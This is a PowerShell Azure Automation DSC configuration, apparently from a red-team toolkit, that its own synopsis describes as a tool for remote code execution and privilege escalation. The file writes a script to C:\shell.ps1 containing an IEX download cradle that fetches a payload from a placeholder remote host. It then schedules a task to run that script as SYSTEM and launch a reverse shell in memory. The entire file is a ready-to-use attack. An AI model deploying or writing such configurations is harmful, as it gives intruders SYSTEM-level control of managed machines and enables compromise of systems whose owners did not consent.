
Configuration ReverseShellConfig
{
    <#
    .SYNOPSIS
    Azure Automation DSC configuration file used for remote code execution and privilege escalation.
 
    .DESCRIPTION
    This configuration file will write a powershell file to disk which will download a payload from a remote server. 
    Once the script is written, a scheduled task is configured to run the script as SYSTEM.
    #>

    Import-DscResource -ModuleName ComputerManagementDsc

    Node localhost

        {
	    # Writes a powershell script to disk that download's a payload from a remote server
	    # Replace the parameters with your own

	    File DownloadPayload{
	      DestinationPath = "C:\shell.ps1"
	      Ensure = "Present"
	      Contents = "IEX(New-Object Net.WebClient).downloadString('http://X.X.X.X:443/shell.ps1')"
	    }
	    
        
        ScheduledTask RunPayload
        {
	     # Executes the powershell script to run reverse shell in memory
         # Replace the parameters with your own

          TaskName           = "RunPayload"
          ActionExecutable   = "C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe"
          ActionArguments    = "-File `"C:\shell.ps1`""
          ScheduleType       = 'Once'
          RepeatInterval     = '00:02:00'
	      RepetitionDuration = '1.00:00:00'
          
        }


    }


}
